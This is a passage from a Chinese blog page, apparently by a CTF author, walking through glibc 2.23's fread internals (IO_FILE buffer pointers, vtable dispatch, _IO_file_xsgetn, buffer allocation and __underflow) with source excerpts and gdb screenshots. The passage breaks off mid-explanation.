<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"zikh26.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="万古凡间一过客，九天之上第一仙">
<meta property="og:type" content="website">
<meta property="og:title" content="ZIKH26&#39;s Blog">
<meta property="og:url" content="https://zikh26.github.io/page/4/index.html">
<meta property="og:site_name" content="ZIKH26&#39;s Blog">
<meta property="og:description" content="万古凡间一过客，九天之上第一仙">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="ZIKH26">
<meta property="article:tag" content="CTF PWN IT">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://zikh26.github.io/page/4/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/4/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ZIKH26's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">ZIKH26's Blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="ZIKH26"
      src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
  <p class="site-author-name" itemprop="name">ZIKH26</p>
  <div class="site-description" itemprop="description">万古凡间一过客，九天之上第一仙</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">98</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">100</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/323816c7.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/323816c7.html" class="post-title-link" itemprop="url">IO学习--源码分析fread函数</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:50:00" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95-%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">源码调试&&分析</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>上一篇分析的是fopen函数，这次来分析下fread函数。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16567446.html">IO学习–源码调试fopen函数</a></p>
<h2 id="前置知识："><a href="#前置知识：" class="headerlink" title="前置知识："></a>前置知识：</h2><p>在分析fread函数时，应该先明确一下输入缓冲区是怎么来的。</p>
<p>首先<strong>fread函数会先将数据读到输入缓冲区中，然后从输入缓冲区中执行memcpy函数，拷贝一定字节的数据到我们指定的内存地址上</strong>。而这个输入缓冲区是从哪到哪呢？由两个指针分别声明了这片区域的开始和结束，他们分别叫做<strong>_IO_read_base和_IO_read_end，他们之间的区域就是输入缓冲区</strong>。这样看起来似乎还需要一个输出缓冲区，难道需要malloc申请两个堆块来分别表示输入缓冲区和输出缓冲区么？非也，其实<strong>malloc函数自始至终只申请了一个堆块</strong>，<strong>这个堆块的区域也叫做reserve area</strong>，而_IO_buf_base和_IO_buf_end两个指针则分别声明了这个reserve area的始末。然后将 _IO_read_ptr; _IO_read_end; _IO_read_base;	_IO_write_base;	_IO_write_ptr; _IO_write_end;这六个指针全部初始化为了_IO_buf_base的值，现在的输入缓冲区和输出缓冲区还不存在(因为现在 _IO_read_end和 _IO_read_base的值相同)，以输入缓冲区为例，<strong>读入数据时是执行了系统调用read，而此时的数据是在reserve area中，紧接着 _IO_read_end就会加上刚刚读入的数据的个数，那么此时 _IO_read_end和 _IO_read_base的值变的不同了。而现在这二者之间的区域就成为输入缓冲区</strong>。</p>
<p>再提一下_IO_FILE结构体中的一些指针(如下)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span> </span><br><span class="line"><span class="type">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line"><span class="type">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line"><span class="type">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br></pre></td></tr></table></figure>

<p>其中_<strong>IO_buf_base 和 _IO_buf_end两个指针的作用分别是标明reserve area的始末</strong>。**_IO_read_base 和  _IO_read_end两个指针的作用分别是标明输入缓冲区的始末(write那两个指针同理)<strong>，现在假设有一个30字节的flag文件，然后我连续执行两次fread函数，每次从文件中只读10字节，那么第二次执行fread函数是从哪开始读呢，很明显并不是文件的开始来读取了，而是接着上回fread函数读到的位置，继续读10字节数据。但我们怎么去记录上回fread函数读到哪了呢，这就需要用到</strong>_IO_read_ptr指针了，它是来记录下一次数据应该从输入缓冲区的哪里开始读了。也就是说_IO_read_base 和 _IO_read_ptr 之间的区域是已经使用了的输入缓冲区，而 _IO_read_ptr 和 _IO_read_end之间的区域是输入缓冲区的剩余部分(也就是还未使用部分)**。</p>
<p>通过上面这两段文字，应该可以对刚学习IO的师傅对_IO_FILE结构体中表示缓冲区位置的指针有一些了解了。</p>
<p>同时这次还要提到vtable，它是_IO_FILE_plus结构体中的一个字段，也是一个虚表指针。它指向了_IO_jump_t结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>对于_IO_jump_t结构体，我目前的理解它就是一个跳转表，这里放的都是函数指针。通过不同的偏移获取不同的函数指针，然后将其调用。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h2><p><img src="/../img/image-20221007220413772.png" alt="image-20221007220413772"></p>
<p><img src="https://s2.loli.net/2022/08/11/U2BbDW57QiMHZGz.png" alt="image-20220811085348962"></p>
<p>上面第一张图片是fread函数的整体流程，第二张图片是根据我下面写的这个源代码对应的函数调用流程(调试的时候结合这两个图片，可以对自己调试到哪部分有个比较清楚的认知)。</p>
<h2 id="源代码："><a href="#源代码：" class="headerlink" title="源代码："></a>源代码：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> value[<span class="number">20</span>];</span><br><span class="line">    FILE* fp=fopen(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    fread(value,<span class="number">1</span>,<span class="number">10</span>,fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>本文的源代码以及调试的程序所依赖的libc都为2.23版本的</strong></p>
<h2 id="源码分析-amp-amp-源码调试"><a href="#源码分析-amp-amp-源码调试" class="headerlink" title="源码分析&amp;&amp;源码调试"></a>源码分析&amp;&amp;源码调试</h2><p>先看fread函数源码，发现它的代码很短(如下)，这里主要就是调用了_IO_sgetn函数</p>
<p><img src="https://s2.loli.net/2022/08/11/Py8OzWV5RXhE7vn.png" alt="image-20220810100233854"></p>
<p>查看_IO_sgetn函数后，发现它只调用了vtable中的_IO_XSGETN</p>
<p><img src="https://s2.loli.net/2022/08/11/OGN6ZoP8EyptgmU.png" alt="image-20220810100551020"></p>
<p>然后再溯源的话就是几个宏定义，代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) \</span></span><br><span class="line"><span class="meta"> (*(struct _IO_jump_t **) ((void *) &amp;_IO_JUMPS_FILE_plus (THIS) \</span></span><br><span class="line"><span class="meta">			   + (THIS)-&gt;_vtable_offset))</span></span><br></pre></td></tr></table></figure>

<p>我简单分析一下上述部分，核心就是_IO_JUMPS_FUNC(THIS)返回了_IO_jump_t地址，由于JUMP2第一个参数就是__xsgetn，所以-&gt;FUNC访问的就是_IO_jump_t结构体中__xsgetn,然后我们用gdb看下此时的_IO_jump_t结构体中的值(如下)，因此最后我们跳转到了0x7ffff7a86df0处。</p>
<img src="https://s2.loli.net/2022/08/11/YXtvqDUhJs4b3wC.png" alt="image-20220810102706007" style="zoom:50%;" />

<p>然后我们看一下汇编如何实现的这里。</p>
<img src="https://s2.loli.net/2022/08/11/eSmUDlx1iQtk4NG.png" alt="image-20220810103020508" style="zoom:50%;" />

<p>先是让rdi+0xd8指向的内容赋值给了rax寄存器。而<strong>此时的rdi就是_IO_list_all的值</strong>，加上0xd8这个偏移，正好就是_IO_FILE_plus结构体中的vtable字段。加上[]寻址后，也就是拿到了_IO_jump_t结构体的地址。</p>
<p>然后第二条指令是<code>mov    rax, qword ptr [rax + 0x40]</code>，而_IO_jump_t结构体中偏移0x40的字段正好就是__xsgetn(如下图)</p>
<p><img src="https://s2.loli.net/2022/08/11/XMZ3fpkr9HPCUse.png" alt="image-20220810104331302"></p>
<p>最后加上[]寻址，rax为0x7ffff7a86df0(如下图)</p>
<img src="https://s2.loli.net/2022/08/11/KMEgbmJIB2tuXR7.png" alt="image-20220810104747743" style="zoom:50%;" />



<p>如此，最终jmp rax，成功跳转到_IO_file_xsgetn函数(如下图)，而这个_IO_file_xsgetn函数也是fread函数实现的核心函数。</p>
<p><img src="https://s2.loli.net/2022/08/11/nbiIR5wgJdTWEc1.png" alt="image-20220810104948954"></p>
<h3 id="IO-file-xsgetn函数"><a href="#IO-file-xsgetn函数" class="headerlink" title="_IO_file_xsgetn函数"></a>_IO_file_xsgetn函数</h3><p>_IO_file_xsgetn函数主要分为三个部分(下面先是对三个部分的简单概括，后面是对三个部分的具体分析)：</p>
<p>1、先是去判断fp-&gt;_IO_buf_base(reserve area)是否为空，如果为空的话，就说明resever area还没有被分配出来，因此去调用_IO_doallocbuf函数来分配一个reserve area（源码如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">	  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">	&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>2、如果输入缓冲区剩余的大小不为空，并且还需要读入一定字节的数据，就调用memcpy函数，将输入缓冲区的数据复制到指的的内存处。have为输入缓冲区剩余大小，want为还要读入的字节数。（源码如下）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">	  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">	  want = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">	      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	      <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">	      s += have;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      want -= have;</span><br><span class="line">	      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">	    &#125;</span><br></pre></td></tr></table></figure>



<p>3、如果输入缓冲区剩余大小为0，并且存在resever area(这片区域就是fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base)，且我们需求size比resever area区域小。那么调用__underflow函数执行系统调用read读入一定字节的数据到resever area中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">     &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">if</span> (__underflow (fp) == EOF)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">continue</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<h3 id="分配resever-area"><a href="#分配resever-area" class="headerlink" title="分配resever area"></a>分配resever area</h3><p>先来看第一部分，也就是如果不存在resever area的情况下调用_IO_doallocbuf函数来分配一个resever area。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_doallocbuf (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)<span class="comment">//如果存在resever area(保留区)的话，就直接返回</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> (_IO_DOALLOCATE (fp) != EOF)<span class="comment">//调用了vtable中的函数</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为是第一次执行fread函数，所以肯定是会调用_IO_doallocbuf 函数的。通过观察上面的源码和下面的图片发现在这个_IO_doallocbuf函数中又调用了_IO_FILE的vtable中的IO_file_doallocate函数(如下图)</p>
<img src="https://s2.loli.net/2022/08/11/RDSyKFhG6QXtVpN.png" alt="image-20220810172752189" style="zoom:50%;" />



<p>我这里就不放IO_file_doallocate函数的源代码了，调试看一下流程吧。</p>
<img src="https://s2.loli.net/2022/08/11/hLblpx6KDswty73.png" alt="image-20220810174150826" style="zoom:50%;" />

<p>si进入IO_file_doallocate函数后，又调用了vtable中的_IO_file_stat函数。</p>
<img src="https://s2.loli.net/2022/08/11/c8VsSxhIEaXf4LG.png" alt="image-20220810174515007" style="zoom:50%;" />

<p>而后又执行了系统调用fstat，这个系统调用是来获取文件状态，并且初始化st结构体的。可以看到此时的st_blksize为4096(如下图)</p>
<img src="https://s2.loli.net/2022/08/11/9t1UW8wcAHm3fBP.png" alt="image-20220810175134043" style="zoom:50%;" />

<p>而这个st_blksize也就是接下来malloc申请的内存大小（也就是reserve area的大小）</p>
<img src="https://s2.loli.net/2022/08/11/dcANr24xuBPn5jq.png" alt="image-20220810175357303" style="zoom:50%;" />

<p>当malloc函数将内存申请出来后，调用了vtable中的_IO_setb函数(如下)</p>
<img src="https://s2.loli.net/2022/08/11/cULi7ys3RaOpBrv.png" alt="image-20220810175823556" style="zoom:50%;" />

<p>这个函数的代码很短</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (_IO_FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过阅读上面的源代码就明白，这个函数主要就是对_IO_buf_base和_IO_buf_end指针进行赋值。至此_IO_doallocbuf函数就结束了。<strong>_IO_doallocbuf函数主要是将resever area申请出来(大小为0x1000),并且对_IO_buf_base和_IO_buf_end指针进行赋值</strong>。</p>
<h3 id="从输入缓冲区中拷贝数据"><a href="#从输入缓冲区中拷贝数据" class="headerlink" title="从输入缓冲区中拷贝数据"></a>从输入缓冲区中拷贝数据</h3><p>第二部分是最简单的，结合下面的源码很容易分析出来，拷贝我们指定的字节的内容从输入缓冲区的剩余部分到指定地址，但如果输入缓冲区剩余大小为空的话，就无法去拷贝。</p>
<p><strong>(have为输入缓冲区剩余大小，want为还要读入的字节数)</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">	  fp-&gt;_IO_read_ptr += want;</span><br><span class="line">	  want = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)</span><br><span class="line">	    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">	      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	      <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">	      s += have;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	      want -= have;</span><br><span class="line">	      fp-&gt;_IO_read_ptr += have;</span><br><span class="line">	    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="执行系统调用read读入数据"><a href="#执行系统调用read读入数据" class="headerlink" title="执行系统调用read读入数据"></a>执行系统调用read读入数据</h3><p>第三部分的核心是__underflow函数。它先是经过一些检查后，去调用了vtable中的_IO_file_underflow函数。检查如下，调用vtable中的_IO_file_underflow函数是在__underflow函数将要返回之时执行的_IO_UNDERFLOW (fp)。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__underflow (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">-1</span>) != <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">	<span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line">	<span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">  <span class="keyword">return</span> _IO_UNDERFLOW (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/08/11/7FsBWa1IfY56eiD.png" alt="image-20220810181956710"></p>
<p>因为宏定义<code># define _IO_new_file_underflow _IO_file_underflow</code>，所以_IO_file_underflow在源码中为_IO_new_file_underflow.</p>
<p>然后上来就是很多检查，不过根据程序当前的状态，直接跳过了前面的检查。先去执行了_IO_switch_to_get_mode 函数，该函数将fp-&gt;_IO_read_base进行了赋值，其他指针依然为0。</p>
<p>等到_IO_switch_to_get_mode函数执行结束，出来之后就是疯狂的对read和write字段进行赋值，这里都初始化为了_IO_buf_base，代码如下</p>
